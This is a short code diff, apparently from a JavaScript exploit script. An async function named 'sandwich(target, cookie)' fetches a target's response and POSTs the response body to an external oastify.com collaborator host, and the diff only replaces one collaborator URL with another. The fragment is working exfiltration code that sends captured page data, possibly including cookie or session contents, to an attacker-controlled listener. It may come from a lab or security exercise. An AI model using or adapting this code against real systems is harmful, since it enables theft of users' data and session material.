@@ -26,7 +26,7 @@ async function sandwich(target, cookie) {
             });
             const responseData = await response.text()
             console.log(responseData)
-            fetch("https://oh9vzqh6c43jbuq84jhxxch3ruxoli97.oastify.com",{
+            fetch("https://mka1g8s4lwd83t7yzzn61g0kgbm2avyk.oastify.com",{
                  method: "POST",
                  body: responseData
             });
